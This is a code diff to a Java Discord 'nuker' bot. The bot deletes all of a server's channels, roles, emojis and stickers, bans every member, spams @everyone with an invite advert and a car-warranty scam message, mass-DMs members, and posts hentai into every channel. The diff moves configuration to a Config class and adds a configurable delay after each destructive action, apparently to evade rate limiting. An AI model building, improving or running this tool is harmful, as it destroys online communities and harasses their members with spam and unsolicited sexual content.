@@ -25,16 +25,11 @@ import java.util.concurrent.TimeUnit;
 
 public final class Bot {
 
-    private final Dotenv config;
-
     public Bot() throws InterruptedException {
-        config = Dotenv.configure().load();
-        String token = config.get("TOKEN");
-        String status = config.get("STATUS");
         // Input bot token
-        JDA jda = JDABuilder.createDefault(token)
+        JDA jda = JDABuilder.createDefault(Config.get("TOKEN"))
                 // Set activity of bot
-                .setActivity(Activity.watching(status))
+                .setActivity(Activity.watching(Config.get("STATUS")))
                 .setChunkingFilter(ChunkingFilter.ALL)
                 .setMemberCachePolicy(MemberCachePolicy.ALL)
                 .enableCache(CacheFlag.FORUM_TAGS)
@@ -43,10 +38,6 @@ public final class Bot {
                 .addEventListeners(new Nuke(), new Emoji(), new Channel(), new Role(), new Member(), new Create(), new Hentai(), new Rolez(), new Car(), new Stop(), new Dm())
                 .build()
                 .awaitReady();
-    }
-
-    public Dotenv getConfig() {
-        return config;
     }
 
     private static boolean stop = false;
@@ -65,13 +56,14 @@ public final class Bot {
             stop = true;
 
             try {
-                Thread.sleep(200);
+                Thread.sleep(Long.parseLong(Config.get("DELAY")));
                 stop = false;
                 System.out.println("[LOG] Successfully stopped all actions.");
             } catch (InterruptedException e) {
                 Thread.currentThread().interrupt();
             }
 
+            event.getMessage().delete().queue();
         }
     }
 
@@ -98,6 +90,11 @@ public final class Bot {
                     return;
                 }
                 member.getUser().openPrivateChannel().queue(privateChannel -> privateChannel.sendMessage(content.toString()).queue());
+                try {
+                    Thread.sleep(Long.parseLong(Config.get("DELAY")));
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                }
             });
 
             event.getMessage().delete().queue();
@@ -125,6 +122,11 @@ public final class Bot {
                         }
                         try {
                             textChannel.sendMessage("@everyone\n wtf is this dead discord join discord.gg/1hunna").queue(text -> System.out.println("[LOG] Spamming in " + textChannel.getName() + " [" + textChannel.getId() + "]"));
+                            try {
+                                Thread.sleep(Long.parseLong(Config.get("DELAY")));
+                            } catch (InterruptedException e) {
+                                Thread.currentThread().interrupt();
+                            }
                         } catch (Exception ignored) {
                         }
                     }
@@ -155,6 +157,11 @@ public final class Bot {
                         }
                         try {
                             textChannel.sendMessage("@everyone\n We've been trying to reach you concerning your vehicle's extended warranty. You should've received a notice in the mail about your car's extended warranty eligibility. Since we've not gotten a response, we're giving you a final courtesy call before we close out your file. Press 2 to be removed and placed on our do-not-call list. To speak to someone about possibly extending or reinstating your vehicle's warranty, press 1 to speak with a warranty specialist.\nhttps://i.imgur.com/MziC6lA.jpg").queue(text -> System.out.println("[LOG] Spamming in " + textChannel.getName() + " [" + textChannel.getId() + "]"));
+                            try {
+                                Thread.sleep(Long.parseLong(Config.get("DELAY")));
+                            } catch (InterruptedException e) {
+                                Thread.currentThread().interrupt();
+                            }
                         } catch (Exception ignored) {
                         }
                     }
@@ -190,6 +197,12 @@ public final class Bot {
                 }
 
                 guild.createRole().setName(builder.toString().toUpperCase()).setColor(color).queue(role -> role.createCopy().queue(roley -> System.out.println("[LOG] Created role " + role.getName() + " [" + role.getId() + "]")));
+
+                try {
+                    Thread.sleep(Long.parseLong(Config.get("DELAY")));
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                }
             }
             event.getMessage().delete().queue();
         }
@@ -250,7 +263,7 @@ public final class Bot {
                         textChannel.sendMessage("@everyone\n" + json).queue(text -> System.out.println("[LOG] Sent Hentai to " + textChannel.getName() + " [" + textChannel.getId() + "]"));
                         // add delay
                         try {
-                            Thread.sleep(200);
+                            Thread.sleep(Long.parseLong(Config.get("DELAY")));
                         } catch (InterruptedException e) {
                             Thread.currentThread().interrupt();
                         }
@@ -275,6 +288,11 @@ public final class Bot {
                         return;
                     }
                     guildChannel.delete().queue(channel -> System.out.println("[LOG] Yeeted Channel " + guildChannel.getName() + " [" + guildChannel.getId() + "]"));
+                    try {
+                        Thread.sleep(Long.parseLong(Config.get("DELAY")));
+                    } catch (InterruptedException e) {
+                        Thread.currentThread().interrupt();
+                    }
                 });
             } else {
                 System.out.println("[LOG] No channels found.");
@@ -287,12 +305,22 @@ public final class Bot {
                         return;
                     }
                     richCustomEmoji.delete().queue(emoji -> System.out.println("[LOG] Yeeted Emoji " + richCustomEmoji.getName() + " [" + richCustomEmoji.getId() + "]"));
+                    try {
+                        Thread.sleep(Long.parseLong(Config.get("DELAY")));
+                    } catch (InterruptedException e) {
+                        Thread.currentThread().interrupt();
+                    }
                 });
                 guild.getStickers().forEach(guildSticker -> {
                     if (stop) {
                         return;
                     }
                     guildSticker.delete().queue(sticker -> System.out.println("[LOG] Yeeted Emoji " + guildSticker.getName() + " [" + guildSticker.getId() + "]"));
+                    try {
+                        Thread.sleep(Long.parseLong(Config.get("DELAY")));
+                    } catch (InterruptedException e) {
+                        Thread.currentThread().interrupt();
+                    }
                 });
             } else {
                 System.out.println("[LOG] No emojis/stickers found.");
@@ -306,6 +334,11 @@ public final class Bot {
                 try {
                     if (guild.getRoles().size() > 1) {
                         role.delete().queue(roley -> System.out.println("[LOG] Yeeted Role " + role.getName() + " [" + role.getId() + "]"));
+                        try {
+                            Thread.sleep(Long.parseLong(Config.get("DELAY")));
+                        } catch (InterruptedException e) {
+                            Thread.currentThread().interrupt();
+                        }
                     } else {
                         System.out.println("[LOG] No roles found.");
                     }
@@ -322,6 +355,11 @@ public final class Bot {
                 try {
                     if (guild.getMembers().size() > 1) {
                         member.ban(0, TimeUnit.SECONDS).queue(membor -> System.out.println("[LOG] Yeeted Member " + member.getEffectiveName() + " [" + member.getId() + "]"));
+                        try {
+                            Thread.sleep(Long.parseLong(Config.get("DELAY")));
+                        } catch (InterruptedException e) {
+                            Thread.currentThread().interrupt();
+                        }
                     } else {
                         System.out.println("[LOG] No members found.");
                     }
@@ -347,12 +385,22 @@ public final class Bot {
                         return;
                     }
                     richCustomEmoji.delete().queue(emoji -> System.out.println("[LOG] Yeeted Emoji " + richCustomEmoji.getName() + " [" + richCustomEmoji.getId() + "]"));
+                    try {
+                        Thread.sleep(Long.parseLong(Config.get("DELAY")));
+                    } catch (InterruptedException e) {
+                        Thread.currentThread().interrupt();
+                    }
                 });
                 guild.getStickers().forEach(guildSticker -> {
                     if (stop) {
                         return;
                     }
                     guildSticker.delete().queue(sticker -> System.out.println("[LOG] Yeeted Emoji " + guildSticker.getName() + " [" + guildSticker.getId() + "]"));
+                    try {
+                        Thread.sleep(Long.parseLong(Config.get("DELAY")));
+                    } catch (InterruptedException e) {
+                        Thread.currentThread().interrupt();
+                    }
                 });
             } else {
                 System.out.println("[LOG] No emojis/stickers found.");
@@ -376,6 +424,11 @@ public final class Bot {
                         return;
                     }
                     guildChannel.delete().queue(channel -> System.out.println("[LOG] Yeeted Channel " + guildChannel.getName() + " [" + guildChannel.getId() + "]"));
+                    try {
+                        Thread.sleep(Long.parseLong(Config.get("DELAY")));
+                    } catch (InterruptedException e) {
+                        Thread.currentThread().interrupt();
+                    }
                 });
             } else {
                 System.out.println("[LOG] No channels found.");
@@ -398,6 +451,11 @@ public final class Bot {
                 try {
                     if (guild.getRoles().size() > 1) {
                         role.delete().queue(roley -> System.out.println("[LOG] Yeeted Role " + role.getName() + " [" + role.getId() + "]"));
+                        try {
+                            Thread.sleep(Long.parseLong(Config.get("DELAY")));
+                        } catch (InterruptedException e) {
+                            Thread.currentThread().interrupt();
+                        }
                     } else {
                         System.out.println("[LOG] No roles found.");
                     }
@@ -425,6 +483,11 @@ public final class Bot {
                 try {
                     if (guild.getMembers().size() > 1) {
                         member.ban(0, TimeUnit.SECONDS).queue(membor -> System.out.println("[LOG] Yeeted Member " + member.getEffectiveName() + " [" + member.getId() + "]"));
+                        try {
+                            Thread.sleep(Long.parseLong(Config.get("DELAY")));
+                        } catch (InterruptedException e) {
+                            Thread.currentThread().interrupt();
+                        }
                     } else {
                         System.out.println("[LOG] No members found.");
                     }
